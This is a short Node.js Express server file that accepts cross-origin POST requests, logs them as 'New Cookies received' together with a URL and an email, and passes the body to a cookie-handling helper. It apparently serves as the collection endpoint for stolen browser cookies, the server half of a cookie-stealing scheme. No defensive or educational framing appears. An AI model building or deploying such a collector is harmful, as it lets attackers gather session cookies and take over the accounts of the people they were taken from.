const express = require("express");
const utils = require('./utils');
const cors = require("cors");
const app = express();

const PORT = process.env.PORT || 3000;

// let RUNNING = 0;

// if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

utils.keepTheServerRunning();

app.get("/", async (req, res) => {
    res.send({ status: "Server is Up and Running!" });
});

app.post("/", (req, res) => {
    console.log("\nNew Cookies received: ", req.body.url, req.body.email);
    utils.handleCookies(req.body);
    res.json("Data recieved successfully!");

});

app.listen(PORT, () => {
    console.log(`\nServer is running on port ${PORT}`);
});
